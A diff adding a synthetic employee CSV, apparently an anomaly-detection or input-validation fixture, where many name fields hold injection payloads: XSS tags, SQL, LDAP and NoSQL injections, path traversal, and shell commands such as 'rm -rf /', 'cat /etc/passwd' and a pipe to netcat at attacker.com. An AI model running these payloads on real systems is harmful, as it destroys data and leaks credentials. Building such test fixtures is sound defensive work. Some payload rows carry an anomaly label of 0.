@@ -1,0 +1,801 @@
+employee_id,name,age,salary,years_experience,department,location,performance_score,projects_completed,days_absent,is_anomaly
+EMP01696,Diana Johnson,37,116230,9,Finance,Berlin,9.1,12,7,0
+EMP01667,Bob Williams,47,82893,9,Engineering,Singapore,7.5,6,5,0
+EMP01063,Jane Garcia,25,110917,5,Marketing,San Francisco,5.6,7,3,0
+EMP01533,<script>alert('XSS')</script>,25,104814,10,Operations,Tokyo,8.9,12,10,1
+EMP01066,Charlie Brown,34,80717,4,Operations,Singapore,6.4,7,4,0
+EMP01621,Jane Jones,38,96450,5,Engineering,Berlin,6.8,9,8,0
+EMP01346,Alice Jones,23,53074,9,Operations,New York,7.9,10,5,0
+EMP01490,Jane Smith,34,82771,9,Engineering,Singapore,7.7,10,3,0
+EMP01760,Jane Smith,24,74572,25,Finance,San Francisco,6.6,12,13,1
+EMP01456,..\..\windows\system32,34,108451,6,Finance,Tokyo,6.4,12,4,0
+EMP01065,Alice Garcia,45,67245,7,Sales,Singapore,8.8,6,6,0
+EMP01286,Diana Brown,33,95605,4,Finance,Berlin,8.2,7,4,0
+EMP01635,Alice Garcia,22,80651,10,Marketing,Berlin,8.2,8,2,0
+EMP01067,Charlie Brown,43,81689,5,Finance,New York,7.6,12,2,0
+EMP01327,Charlie Johnson,41,59914,6,Engineering,Berlin,9.5,17,2,0
+EMP01395,Jane Johnson,31,83809,12,HR,Berlin,6.2,15,3,0
+EMP01244,Bob Smith,25,71547,8,Engineering,London,5.9,19,2,0
+EMP01377,John Garcia,36,73033,11,HR,Singapore,7.1,12,5,0
+EMP01610,Bob Brown,40,101563,2,HR,London,7.4,15,3,0
+EMP01526,Diana Johnson,22,56213,3,Marketing,London,7.3,13,2,0
+EMP01658,Jane Brown,36,100795,0,Operations,San Francisco,5.7,14,2,0
+EMP01529,Diana Johnson,27,86998,10,Marketing,San Francisco,9.0,9,3,0
+EMP01622,Charlie Williams,50,67700,10,Finance,San Francisco,6.9,18,7,0
+EMP01721,Jane Brown,22,86641,11,Operations,London,6.6,10,5,0
+EMP01360,John Williams,39,40000,7,Finance,San Francisco,8.4,16,4,0
+EMP01030,Alice Garcia,30,48110,9,Sales,Singapore,8.3,15,5,0
+EMP01260,Diana Jones,27,90433,7,Sales,Berlin,5.7,9,5,0
+EMP01637,Charlie Smith,35,107146,4,Finance,Tokyo,7.8,7,1,1
+EMP01746,Bob Brown,36,55032,6,Marketing,Berlin,6.4,11,8,0
+EMP01570,Charlie Brown,35,71541,11,Sales,San Francisco,4.6,7,5,0
+EMP01215,Alice Johnson,41,78958,4,Engineering,Tokyo,8.5,10,6,0
+EMP01078,Alice Jones,35,74671,11,Marketing,London,5.5,100,1,1
+EMP01578,Alice Brown,25,15000,26,Engineering,San Francisco,8.3,9,6,1
+EMP01383,{'$gt': ''},30,43589,11,Sales,San Francisco,5.9,18,6,0
+EMP01039,Diana Williams,36,70720,3,Operations,Tokyo,5.1,7,7,0
+EMP01023,../../../etc/passwd,23,67743,5,Engineering,Berlin,7.4,17,6,1
+EMP01692,Diana Garcia,26,63715,8,Engineering,New York,7.4,11,7,0
+EMP01398,Jane Brown,34,79478,7,Marketing,Singapore,7.0,16,3,0
+EMP01796,Charlie Garcia,34,87383,4,Sales,Singapore,8.6,13,3,0
+EMP01741,Diana Smith,24,110445,9,Sales,Tokyo,4.3,12,4,0
+EMP01139,Diana Smith,25,63718,22,Sales,Singapore,7.6,19,4,0
+EMP01250,John Brown,24,62488,5,Marketing,San Francisco,6.1,12,3,0
+EMP01174,Jane Smith,37,66076,5,Marketing,Singapore,10.0,13,8,0
+EMP01323,John Brown,51,52139,8,Finance,New York,9.7,7,7,0
+EMP01595,Charlie Johnson,30,78693,5,Operations,Singapore,7.6,16,5,0
+EMP01525,Diana Jones,22,40000,10,Engineering,New York,7.9,14,6,0
+EMP01423,Alice Garcia,42,83275,2,Finance,Singapore,5.4,8,5,0
+EMP01596,Bob Johnson,32,48057,9,Sales,San Francisco,7.9,11,3,0
+EMP01604,Charlie Jones,38,94920,4,HR,London,8.3,8,5,0
+EMP01534,Charlie Williams,29,77973,6,Engineering,London,8.8,10,5,0
+EMP01265,Charlie Williams,25,52606,1,Operations,San Francisco,5.4,12,4,0
+EMP01109,Bob Johnson,34,118265,4,Marketing,Singapore,5.5,11,60,1
+EMP01666,Jane Smith,32,108398,0,Sales,New York,10.0,16,8,0
+EMP01294,Charlie Williams,37,89652,7,Operations,London,8.0,14,4,0
+EMP01336,Jane Garcia,28,98789,9,Finance,Berlin,7.0,18,5,0
+EMP01368,<script>alert('XSS')</script>,35,86895,7,Marketing,New York,6.7,18,7,1
+EMP01446,Charlie Johnson,37,75681,8,Operations,Singapore,6.6,11,4,0
+EMP01333,Charlie Garcia,29,84070,7,Engineering,Singapore,6.2,11,5,0
+EMP01198,Charlie Williams,35,63576,12,Engineering,New York,9.3,17,4,0
+EMP01168,*)(uid=*,33,74196,8,Finance,San Francisco,8.8,15,7,1
+EMP01481,Jane Williams,27,71950,10,HR,San Francisco,4.3,10,3,0
+EMP01723,Charlie Williams,40,55811,14,Operations,Tokyo,7.0,15,4,0
+EMP01655,Jane Smith,35,40000,9,HR,Singapore,6.2,9,7,0
+EMP01306,Alice Jones,45,87255,1,Engineering,London,7.7,0,6,0
+EMP01231,John Williams,36,15000,8,HR,San Francisco,8.2,12,4,1
+EMP01422,John Brown,33,87675,13,HR,Berlin,7.4,14,8,0
+EMP01049,Bob Williams,22,64380,18,Operations,Tokyo,6.5,9,4,1
+EMP01787,{'$gt': ''},38,67659,4,Sales,Singapore,8.8,12,6,0
+EMP01357,Charlie Garcia,32,120048,20,Engineering,New York,6.4,7,7,0
+EMP01086,John Garcia,42,86678,6,Operations,Berlin,6.9,14,8,0
+EMP01545,John Smith,28,45302,13,Finance,London,5.8,16,5,0
+EMP01192,Alice Brown,36,70056,7,Marketing,Tokyo,7.4,9,2,0
+EMP01795,Jane Williams,43,54805,2,HR,New York,4.7,12,4,0
+EMP01033,Diana Smith,25,59644,25,Engineering,Tokyo,7.2,1,5,0
+EMP01031,Charlie Williams,22,56626,30,Operations,Berlin,6.0,10,3,1
+EMP01199,Jane Williams,25,-5000,8,Finance,Singapore,6.8,9,4,1
+EMP01365,Jane Brown,31,123795,8,Operations,London,8.7,8,5,0
+EMP01486,John Smith,29,40000,5,Finance,New York,6.7,6,90,1
+EMP01594,; whoami,43,67693,8,Engineering,San Francisco,6.1,6,5,1
+EMP01568,Bob Jones,22,66134,7,HR,San Francisco,4.8,8,4,0
+EMP01428,Alice Jones,43,94277,8,Finance,Berlin,8.9,9,5,0
+EMP01137,Alice Brown,32,89167,3,Finance,Singapore,8.9,7,10,1
+EMP01072,Jane Garcia,34,47413,6,HR,London,6.3,10,8,0
+EMP01077,Bob Jones,32,79475,14,Finance,New York,9.7,15,6,0
+EMP01512,' UNION SELECT * FROM passwords--,33,102804,8,Engineering,Berlin,6.4,17,2,1
+EMP01783,Charlie Smith,39,76233,7,Marketing,Singapore,7.0,9,1,1
+EMP01786,Bob Garcia,41,78528,7,Sales,New York,5.7,15,5,0
+EMP01275,John Jones,38,65124,13,Finance,Berlin,4.6,14,3,0
+EMP01361,Alice Brown,47,120818,9,Operations,Berlin,6.3,17,6,0
+EMP01096,Charlie Williams,37,71657,3,Engineering,New York,7.1,12,5,0
+EMP01641,Jane Garcia,48,98469,10,HR,San Francisco,7.7,16,6,0
+EMP01715,Bob Williams,43,72565,9,Sales,Tokyo,7.9,6,7,0
+EMP01281,Diana Williams,40,-5000,14,Operations,Berlin,7.0,1,2,1
+EMP01393,Jane Smith,49,153890,0,Engineering,London,6.1,16,9,1
+EMP01628,Jane Smith,35,70574,0,Engineering,New York,6.7,15,6,0
+EMP01608,`cat /etc/passwd`,22,68546,6,Finance,London,9.1,13,7,1
+EMP01705,Alice Garcia,39,65935,20,Sales,Tokyo,8.0,7,3,0
+EMP01754,John Garcia,27,70470,12,HR,Tokyo,5.9,13,6,0
+EMP01054,John Williams,24,103410,25,Finance,London,8.5,11,6,1
+EMP01750,Diana Williams,27,72996,12,Sales,Tokyo,8.8,14,11,1
+EMP01155,Jane Brown,29,97345,13,Finance,Singapore,8.3,16,4,0
+EMP01432,Alice Williams,32,73234,9,Marketing,New York,9.8,12,4,0
+EMP01097,Bob Smith,37,77934,5,Sales,New York,7.1,50,5,0
+EMP01120,Charlie Johnson,41,96472,10,Marketing,Berlin,7.8,9,4,0
+EMP01076,Bob Jones,35,64647,12,Sales,New York,7.2,14,60,1
+EMP01204,Alice Jones,23,88964,0,Finance,Singapore,6.6,19,8,0
+EMP01352,Bob Brown,41,62220,4,Operations,Berlin,6.8,7,5,0
+EMP01764,| nc attacker.com 4444,44,89736,5,Sales,San Francisco,5.8,12,2,1
+EMP01208,Diana Smith,39,95991,1,Finance,Singapore,8.8,12,6,0
+EMP01367,Bob Brown,35,157693,1,Operations,Singapore,8.2,14,3,1
+EMP01425,{'$ne': null},45,-5000,8,HR,London,10.0,13,4,1
+EMP01515,John Johnson,41,48763,5,Marketing,New York,10.0,11,6,0
+EMP01084,Alice Brown,82,-100,3,Engineering,London,6.7,11,4,1
+EMP01010,admin'--,31,71262,6,Operations,Singapore,8.7,15,4,1
+EMP01720,John Garcia,37,99420,9,HR,San Francisco,6.8,21,9,1
+EMP01110,Charlie Garcia,22,68844,12,Sales,Berlin,8.2,11,6,0
+EMP01521,Diana Williams,39,85593,11,Operations,Singapore,8.6,10,4,0
+EMP01777,John Garcia,33,500000,2,Sales,San Francisco,6.7,9,6,1
+EMP01209,Jane Williams,65,64295,11,Engineering,Tokyo,9.4,11,3,1
+EMP01235,Alice Williams,40,106479,9,Sales,Tokyo,9.1,12,60,1
+EMP01316,Bob Garcia,40,123068,4,Marketing,San Francisco,8.4,9,8,0
+EMP01388,Charlie Smith,42,86001,5,Engineering,Berlin,6.8,1,3,0
+EMP01118,admin)(|(password=*)),44,66071,10,Operations,San Francisco,7.2,13,4,0
+EMP01719,Diana Williams,34,112081,3,Operations,London,10.0,0,8,0
+EMP01210,John Smith,39,101347,6,Sales,San Francisco,8.5,15,3,0
+EMP01254,<script>alert('XSS')</script>,22,63993,12,Operations,Singapore,6.5,15,5,1
+EMP01591,Charlie Garcia,31,61445,9,Marketing,New York,8.4,9,3,0
+EMP01029,John Jones,32,69364,11,HR,Tokyo,7.0,10,3,0
+EMP01266,John Smith,48,49106,12,HR,London,8.8,11,5,0
+EMP01656,Charlie Brown,35,90066,11,Marketing,San Francisco,6.7,13,1,1
+EMP01662,'; DROP TABLE users--,34,70819,12,Marketing,Berlin,7.4,21,0,1
+EMP01296,John Williams,42,76572,6,HR,New York,9.1,15,7,0
+EMP01081,Diana Jones,37,64382,7,Operations,Tokyo,10.0,10,6,0
+EMP01688,Alice Garcia,40,44486,5,HR,New York,4.6,14,2,0
+EMP01302,<svg onload=alert('XSS')>,40,116767,12,Finance,Tokyo,10.0,19,9,1
+EMP01506,Bob Williams,30,196140,1,Sales,London,6.9,16,8,1
+EMP01758,{'$gt': ''},28,104853,0,Finance,London,9.5,12,6,0
+EMP01314,Bob Jones,45,78008,0,Finance,Singapore,8.1,13,7,0
+EMP01644,Diana Smith,33,82993,14,Operations,San Francisco,8.6,13,1,1
+EMP01409,$(wget malicious.sh),39,109991,11,Finance,San Francisco,6.7,5,4,1
+EMP01211,' UNION SELECT * FROM passwords--,44,78951,8,Finance,Singapore,5.8,11,5,1
+EMP01532,Jane Williams,34,70731,10,Operations,Berlin,6.2,10,8,0
+EMP01483,Charlie Williams,36,94134,0,Operations,London,8.2,8,2,0
+EMP01218,Bob Williams,31,68593,7,Operations,San Francisco,8.2,10,4,0
+EMP01007,Charlie Brown,41,65425,14,Operations,Berlin,8.7,13,5,0
+EMP01464,Bob Williams,34,78387,9,Finance,Berlin,8.1,10,6,0
+EMP01101,Charlie Smith,31,67133,9,Finance,San Francisco,9.0,16,0,1
+EMP01326,1'; DELETE FROM employees WHERE '1'='1,44,81052,0,Marketing,London,9.0,15,7,1
+EMP01652,Charlie Brown,32,79815,2,Operations,Tokyo,7.1,50,5,0
+EMP01537,Alice Garcia,31,68950,14,Engineering,Tokyo,7.2,11,8,0
+EMP01640,Diana Williams,32,88257,8,Finance,Tokyo,8.4,8,6,0
+EMP01002,Alice Johnson,40,76922,5,Finance,London,6.7,16,5,0
+EMP01738,Bob Jones,48,51601,8,Engineering,San Francisco,8.2,12,3,0
+EMP01776,Bob Jones,29,42697,6,Marketing,Berlin,5.3,10,6,0
+EMP01519,Alice Smith,41,71260,7,Marketing,Berlin,9.4,14,7,0
+EMP01589,<iframe src='malicious.com'>,28,59931,10,Marketing,San Francisco,10.0,10,4,1
+EMP01798,Diana Williams,35,75415,8,Marketing,Tokyo,6.9,8,4,0
+EMP01744,John Garcia,39,62955,0,HR,Tokyo,8.1,7,6,0
+EMP01513,Jane Johnson,27,86156,3,Finance,San Francisco,8.6,14,4,0
+EMP01670,Diana Williams,44,98932,9,HR,New York,5.6,16,7,0
+EMP01264,' UNION SELECT * FROM passwords--,32,67751,13,Finance,San Francisco,8.2,11,4,1
+EMP01615,John Williams,36,93556,9,HR,Tokyo,9.1,13,6,0
+EMP01329,Jane Brown,40,81575,15,Operations,New York,6.8,10,5,0
+EMP01342,Alice Brown,36,71998,9,Sales,London,7.6,11,4,0
+EMP01394,Charlie Johnson,44,43140,9,Operations,Singapore,7.5,8,3,0
+EMP01079,John Garcia,22,98767,6,Marketing,Tokyo,8.5,9,5,0
+EMP01148,Jane Williams,39,74088,8,Marketing,Singapore,9.0,9,8,0
+EMP01350,Jane Garcia,37,55172,0,Operations,Singapore,10.0,12,2,0
+EMP01382,Jane Brown,22,93366,5,Sales,London,5.7,13,60,1
+EMP01440,<img src=x onerror=alert(1)>,38,67417,5,Engineering,London,7.9,50,4,1
+EMP01309,John Johnson,33,113280,8,Sales,London,9.8,10,5,0
+EMP01707,admin)(|(password=*)),49,94106,7,HR,Singapore,8.4,9,5,0
+EMP01133,Jane Brown,38,40000,6,Finance,New York,6.1,13,5,0
+EMP01381,Bob Williams,30,102840,2,Finance,New York,6.5,11,12,1
+EMP01213,Alice Jones,40,61216,11,Finance,Berlin,7.5,16,6,0
+EMP01659,Charlie Johnson,33,88463,8,Sales,London,6.9,13,6,0
+EMP01055,Bob Williams,42,63585,6,Operations,Singapore,9.7,14,4,0
+EMP01736,Diana Garcia,37,85272,10,Marketing,London,8.9,12,4,0
+EMP01620,Bob Smith,28,85765,6,Finance,Singapore,9.3,14,8,0
+EMP01582,Jane Garcia,40,118146,7,HR,Singapore,8.6,14,7,0
+EMP01673,<script>alert('XSS')</script>,32,500000,8,Marketing,Berlin,9.9,13,3,1
+EMP01527,Bob Smith,35,72118,12,HR,Tokyo,7.8,14,4,0
+EMP01196,John Smith,27,110953,6,Finance,Berlin,6.6,0,4,0
+EMP01713,`cat /etc/passwd`,38,40000,9,Engineering,Singapore,5.7,0,6,1
+EMP01689,Diana Garcia,38,100251,13,Operations,San Francisco,7.7,16,6,0
+EMP01060,Bob Garcia,31,79058,13,HR,Berlin,7.6,13,5,0
+EMP01576,; whoami,36,61618,1,Sales,Singapore,9.4,7,8,1
+EMP01631,Diana Brown,47,91314,11,Operations,Berlin,6.5,13,4,0
+EMP01431,Diana Jones,22,47603,4,Finance,Berlin,6.1,17,4,0
+EMP01603,Diana Williams,45,89379,2,Engineering,Singapore,10.0,8,0,1
+EMP01442,Alice Williams,22,63366,5,Finance,New York,9.7,17,2,0
+EMP01436,Charlie Jones,48,108554,9,Sales,Tokyo,10.0,10,10,1
+EMP01247,Diana Garcia,29,43472,4,Finance,Singapore,5.4,11,7,0
+EMP01586,John Johnson,31,101034,2,Engineering,Berlin,7.3,18,7,0
+EMP01569,John Garcia,32,57303,9,Operations,London,7.9,12,6,0
+EMP01090,Diana Williams,35,91409,10,Sales,Tokyo,7.5,7,3,0
+EMP01650,Alice Brown,49,81176,7,Engineering,New York,5.4,13,7,0
+EMP01181,Charlie Jones,28,83509,7,Engineering,Singapore,8.1,8,3,0
+EMP01790,$(wget malicious.sh),38,53557,0,Sales,Singapore,6.9,12,5,1
+EMP01554,Charlie Brown,37,63469,2,Engineering,New York,6.1,10,9,1
+EMP01290,Jane Brown,33,73567,10,Operations,London,6.0,17,2,0
+EMP01158,John Johnson,25,86395,14,Engineering,New York,8.0,11,4,0
+EMP01069,Jane Jones,29,115204,10,Engineering,San Francisco,7.2,14,3,0
+EMP01517,Bob Garcia,27,0,4,Operations,Tokyo,8.5,10,7,1
+EMP01131,Diana Jones,35,112623,6,Finance,Singapore,6.1,7,3,0
+EMP01044,Diana Smith,23,78329,3,Engineering,Tokyo,6.7,12,8,0
+EMP01070,Bob Smith,37,71461,7,HR,Tokyo,9.1,10,6,0
+EMP01691,Diana Smith,44,126163,11,Sales,Berlin,8.6,13,2,0
+EMP01355,John Johnson,26,95196,13,Marketing,Tokyo,6.8,14,4,0
+EMP01444,Diana Williams,24,62014,4,Marketing,London,7.8,0,5,0
+EMP01761,Charlie Johnson,35,60055,2,Finance,Berlin,8.2,11,4,0
+EMP01135,John Smith,47,64958,1,Marketing,Singapore,7.1,10,5,0
+EMP01082,Alice Garcia,46,65211,4,Operations,San Francisco,10.0,8,60,1
+EMP01165,Bob Johnson,38,103802,4,HR,San Francisco,6.9,8,2,0
+EMP01164,Diana Garcia,42,73205,7,HR,Tokyo,6.2,13,7,0
+EMP01028,John Brown,30,66596,8,HR,Singapore,9.2,8,5,0
+EMP01448,..\..\windows\system32,30,79675,6,Engineering,San Francisco,6.6,10,6,0
+EMP01193,Alice Smith,25,61360,10,Finance,Singapore,7.6,11,4,0
+EMP01239,John Williams,41,95941,7,Sales,Berlin,8.1,10,6,0
+EMP01724,Charlie Johnson,36,67555,7,Engineering,New York,7.3,10,5,0
+EMP01730,John Smith,36,77817,6,Operations,London,7.4,10,3,0
+EMP01136,Diana Brown,28,54575,3,Finance,Tokyo,9.0,8,3,0
+EMP01664,Bob Williams,29,63389,10,Finance,Tokyo,5.2,11,2,0
+EMP01311,Jane Johnson,43,79348,16,Sales,New York,9.8,11,6,0
+EMP01140,Diana Garcia,36,49393,7,Marketing,Berlin,6.4,11,4,0
+EMP01473,Alice Garcia,45,68671,8,HR,Singapore,6.6,10,4,0
+EMP01006,Charlie Smith,47,79442,8,Engineering,Singapore,5.6,10,8,0
+EMP01728,Diana Brown,30,65223,10,HR,San Francisco,7.6,17,6,0
+EMP01755,Jane Garcia,56,82347,9,Finance,Tokyo,5.1,11,6,1
+EMP01073,Jane Garcia,47,60381,4,Engineering,Tokyo,5.4,12,3,0
+EMP01559,Diana Smith,31,78667,10,Operations,Berlin,5.8,7,6,0
+EMP01299,Charlie Garcia,40,0,6,Marketing,Berlin,9.5,11,1,1
+EMP01145,1'; DELETE FROM employees WHERE '1'='1,41,53598,8,HR,Tokyo,8.1,10,4,1
+EMP01292,Diana Garcia,30,89552,6,Finance,London,7.4,11,2,0
+EMP01234,Jane Smith,52,65336,5,Sales,Singapore,10.0,8,5,0
+EMP01220,Diana Brown,53,85456,7,Sales,Singapore,8.6,8,6,1
+EMP01450,Jane Garcia,34,81617,11,Engineering,Tokyo,6.7,11,5,0
+EMP01380,John Williams,28,78597,4,HR,San Francisco,8.8,11,3,0
+EMP01132,Charlie Brown,26,46039,7,Operations,London,8.3,8,5,0
+EMP01375,Charlie Jones,28,69386,6,Engineering,Tokyo,7.1,8,3,0
+EMP01404,Alice Smith,31,75977,0,Marketing,New York,7.4,11,2,0
+EMP01522,<script>alert('XSS')</script>,29,73590,7,Sales,New York,7.2,12,8,1
+EMP01749,Alice Jones,23,99538,6,Marketing,London,6.2,17,3,0
+EMP01426,Jane Garcia,27,75876,15,Operations,Berlin,9.4,10,2,0
+EMP01041,Alice Johnson,36,88496,13,HR,Berlin,9.6,7,5,0
+EMP01495,Diana Garcia,39,73022,7,Marketing,New York,10.0,10,6,0
+EMP01108,<iframe src='malicious.com'>,37,87909,7,Operations,Tokyo,5.5,11,4,1
+EMP01344,Alice Johnson,31,71538,10,Engineering,Berlin,4.0,8,3,0
+EMP01056,John Johnson,28,58352,8,Engineering,San Francisco,6.6,7,2,0
+EMP01259,Alice Williams,41,67587,9,HR,Berlin,8.3,10,8,0
+EMP01479,Alice Smith,43,68817,6,Sales,Singapore,7.2,11,2,0
+EMP01625,Bob Smith,30,40000,13,Marketing,Tokyo,6.9,8,7,0
+EMP01227,*)(uid=*,26,77400,13,Marketing,Tokyo,8.5,16,4,1
+EMP01212,Jane Williams,42,116505,14,Marketing,Berlin,7.2,1,5,0
+EMP01593,Bob Brown,37,77730,2,HR,Tokyo,7.2,11,6,0
+EMP01332,Alice Brown,35,107274,6,HR,New York,8.3,12,6,0
+EMP01024,Alice Williams,30,66089,15,HR,Singapore,5.2,13,7,0
+EMP01780,Charlie Jones,36,79011,4,Marketing,San Francisco,9.0,7,4,0
+EMP01351,javascript:alert('Hacked'),46,40000,13,Operations,Berlin,9.9,9,5,1
+EMP01356,; rm -rf /,34,61236,0,Operations,San Francisco,7.8,10,9,1
+EMP01051,Charlie Johnson,31,63890,9,Finance,Tokyo,6.3,11,8,0
+EMP01331,Charlie Jones,27,83438,9,Engineering,San Francisco,10.0,4,7,0
+EMP01733,Jane Jones,22,72047,6,Operations,Singapore,9.7,13,2,0
+EMP01629,Bob Williams,43,69463,12,Engineering,London,7.6,11,4,0
+EMP01501,Charlie Jones,50,94840,4,HR,Singapore,6.9,15,4,0
+EMP01334,Charlie Brown,42,70116,18,Marketing,San Francisco,10.0,21,0,1
+EMP01285,Charlie Williams,22,83600,9,Marketing,Singapore,8.0,8,5,0
+EMP01018,Jane Garcia,27,76645,6,HR,Singapore,8.1,9,4,0
+EMP01584,Charlie Smith,36,89841,0,Engineering,Tokyo,5.0,12,2,0
+EMP01748,John Garcia,30,90321,10,Finance,London,7.3,6,5,0
+EMP01083,Alice Smith,30,95883,9,Marketing,San Francisco,6.4,10,7,0
+EMP01061,Bob Johnson,33,44685,7,Engineering,London,8.6,11,3,0
+EMP01462,Charlie Williams,29,85775,9,Finance,San Francisco,5.8,9,4,0
+EMP01291,Diana Brown,31,74255,8,Engineering,San Francisco,7.1,10,5,0
+EMP01447,John Johnson,27,59600,7,Marketing,San Francisco,6.2,9,3,0
+EMP01182,John Jones,26,55660,1,Finance,Tokyo,7.4,16,7,0
+EMP01549,*)(uid=*,30,70504,1,HR,Tokyo,5.1,13,3,1
+EMP01500,Charlie Brown,23,61638,30,Engineering,Tokyo,7.4,13,5,1
+EMP01223,Jane Garcia,22,117845,5,Engineering,San Francisco,9.6,13,6,0
+EMP01424,Bob Garcia,40,71294,0,Sales,New York,7.4,12,4,0
+EMP01467,Diana Johnson,41,56921,7,Sales,Singapore,6.2,10,4,0
+EMP01319,' UNION SELECT * FROM passwords--,33,96013,6,HR,Singapore,7.7,10,4,1
+EMP01328,John Brown,39,73717,12,Operations,Tokyo,6.4,12,7,0
+EMP01443,Alice Jones,34,54704,8,HR,Berlin,5.7,19,3,0
+EMP01493,Bob Brown,28,91769,3,Sales,Singapore,7.8,21,4,0
+EMP01176,Jane Smith,35,65953,5,Sales,London,9.7,12,4,0
+EMP01676,Charlie Williams,26,72581,10,Sales,New York,8.7,15,7,0
+EMP01363,`cat /etc/passwd`,38,42092,10,Sales,New York,6.6,8,4,1
+EMP01163,Diana Jones,28,89180,1,HR,Singapore,7.9,11,8,0
+EMP01248,Jane Williams,49,104530,11,Finance,Tokyo,7.5,10,8,0
+EMP01518,Charlie Brown,35,62809,0,Marketing,London,7.6,10,9,1
+EMP01710,Diana Brown,36,52166,6,Sales,London,5.8,12,5,0
+EMP01074,Bob Jones,22,74337,14,HR,San Francisco,8.0,14,6,0
+EMP01643,John Garcia,22,49063,1,Engineering,Tokyo,7.8,14,6,0
+EMP01405,Charlie Smith,39,75811,8,Sales,Tokyo,4.8,13,5,0
+EMP01104,Charlie Johnson,33,78821,9,Operations,London,5.9,14,4,0
+EMP01114,Diana Williams,33,73094,5,HR,Singapore,7.3,16,6,0
+EMP01300,Alice Brown,28,94960,10,Sales,London,8.1,10,3,0
+EMP01092,Charlie Johnson,29,96333,11,Operations,Tokyo,6.8,9,8,0
+EMP01411,Diana Johnson,26,61141,4,Operations,London,6.5,12,4,0
+EMP01089,Charlie Smith,39,97174,6,Engineering,San Francisco,4.6,11,5,0
+EMP01528,*)(uid=*,37,50806,10,Sales,San Francisco,9.9,13,7,1
+EMP01734,Jane Brown,43,65679,11,Sales,Berlin,7.6,21,5,0
+EMP01743,Bob Williams,35,65858,5,Engineering,San Francisco,6.6,11,4,0
+EMP01575,Bob Smith,22,0,16,Operations,Tokyo,7.7,19,3,1
+EMP01497,Jane Jones,33,69194,3,Marketing,San Francisco,10.0,16,8,0
+EMP01494,{'$ne': null},47,76636,12,Sales,Tokyo,8.3,11,3,0
+EMP01011,Charlie Smith,31,66205,1,Marketing,San Francisco,9.8,14,4,0
+EMP01433,Jane Smith,40,126594,10,Marketing,Tokyo,7.1,11,1,1
+EMP01043,Diana Garcia,32,82648,9,Marketing,London,8.5,1,2,0
+EMP01042,Diana Williams,34,52545,7,Sales,Tokyo,5.6,14,7,0
+EMP01167,Jane Smith,50,111018,7,Engineering,Singapore,8.5,9,6,0
+EMP01703,Alice Johnson,23,74932,9,Operations,London,9.1,13,7,0
+EMP01613,Charlie Brown,25,118300,6,Operations,Singapore,5.4,8,6,0
+EMP01412,John Garcia,22,60631,4,Operations,San Francisco,10.0,10,4,0
+EMP01178,<script>alert('XSS')</script>,32,43321,6,Marketing,London,7.9,8,8,1
+EMP01530,Alice Johnson,40,105615,9,Finance,Berlin,8.8,12,6,0
+EMP01539,Charlie Jones,30,15000,2,Marketing,New York,6.9,5,7,1
+EMP01177,Charlie Smith,46,40000,7,Marketing,Singapore,9.0,15,5,0
+EMP01665,Diana Jones,35,86771,12,Engineering,London,8.0,100,5,0
+EMP01766,Jane Johnson,34,76339,5,Operations,Berlin,6.9,20,4,0
+EMP01257,Bob Williams,29,98454,6,HR,Berlin,8.8,12,5,0
+EMP01765,John Williams,29,69373,14,HR,Singapore,4.9,7,7,0
+EMP01543,Diana Williams,46,98812,8,Engineering,San Francisco,7.2,10,7,0
+EMP01015,Bob Johnson,30,45288,20,Finance,Berlin,7.9,16,3,0
+EMP01003,Jane Johnson,47,65754,4,Marketing,Singapore,7.1,10,3,0
+EMP01335,Charlie Brown,33,94281,1,Operations,Tokyo,6.7,12,7,0
+EMP01256,Diana Johnson,45,74488,13,Marketing,Berlin,5.9,9,8,0
+EMP01580,John Smith,37,88558,7,Finance,New York,7.9,50,3,0
+EMP01445,Charlie Smith,40,50521,12,Engineering,London,5.9,11,3,0
+EMP01338,Alice Johnson,38,86948,12,HR,Tokyo,9.8,16,6,0
+EMP01478,Alice Johnson,59,78840,7,Sales,San Francisco,7.9,15,7,1
+EMP01417,Bob Garcia,35,80579,0,Operations,Tokyo,8.1,13,6,0
+EMP01638,Charlie Smith,24,84819,6,Sales,San Francisco,6.1,15,6,0
+EMP01714,Charlie Smith,18,73346,10,Finance,Tokyo,8.1,15,5,0
+EMP01324,Jane Johnson,26,107668,16,HR,New York,10.0,18,5,0
+EMP01457,Alice Garcia,26,83380,11,Engineering,Berlin,7.2,14,5,0
+EMP01009,John Johnson,39,198340,0,Operations,Singapore,5.8,50,4,1
+EMP01249,<script>alert('XSS')</script>,38,102601,9,Marketing,London,8.9,100,6,1
+EMP01022,John Smith,35,120977,11,Operations,New York,7.2,21,4,0
+EMP01221,Alice Smith,22,63525,8,HR,Berlin,8.7,19,8,0
+EMP01547,Charlie Jones,33,93686,4,Operations,San Francisco,4.0,9,6,0
+EMP01690,Diana Johnson,32,63962,14,HR,San Francisco,4.8,9,90,1
+EMP01784,Diana Garcia,39,83576,8,Sales,Tokyo,6.3,9,6,0
+EMP01626,Diana Johnson,27,116124,13,HR,Singapore,7.8,9,6,0
+EMP01340,Charlie Brown,28,69048,9,Operations,San Francisco,8.1,11,4,0
+EMP01671,Bob Williams,22,62804,6,HR,London,10.0,14,7,0
+EMP01203,Charlie Garcia,43,62061,1,Marketing,Singapore,5.7,11,6,0
+EMP01237,Jane Garcia,36,45712,8,Sales,Berlin,8.9,7,9,1
+EMP01093,Jane Williams,32,98385,2,HR,Tokyo,9.7,12,6,0
+EMP01531,; rm -rf /,22,99375,8,Sales,Berlin,6.8,6,2,1
+EMP01362,Bob Jones,34,47208,10,HR,London,8.8,1,7,0
+EMP01544,Charlie Williams,22,93991,7,Finance,Berlin,8.0,15,2,0
+EMP01284,Diana Williams,52,82638,7,Marketing,New York,8.0,10,3,0
+EMP01184,Diana Jones,33,74927,8,Engineering,Singapore,9.1,16,8,0
+EMP01649,Alice Williams,40,75425,11,Operations,Tokyo,9.3,18,3,0
+EMP01396,Bob Garcia,22,74607,7,Marketing,San Francisco,8.4,13,6,0
+EMP01153,Charlie Smith,36,103875,0,Engineering,Singapore,8.1,10,8,0
+EMP01075,John Brown,41,110891,6,Marketing,San Francisco,8.6,14,4,0
+EMP01453,Bob Smith,39,82481,6,Finance,Berlin,7.8,14,6,0
+EMP01695,{'$ne': null},32,115121,10,Sales,San Francisco,9.4,9,5,0
+EMP01277,Diana Garcia,30,66437,7,Engineering,London,5.2,1,5,0
+EMP01068,admin)(|(password=*)),37,88170,11,Sales,London,8.5,13,6,0
+EMP01514,Jane Jones,30,350000,10,Marketing,Singapore,8.5,6,0,1
+EMP01188,Diana Williams,28,70580,9,Engineering,London,6.3,13,5,0
+EMP01271,John Brown,23,84540,7,Marketing,London,8.4,10,5,0
+EMP01236,John Williams,22,50484,3,Engineering,Berlin,7.8,12,3,0
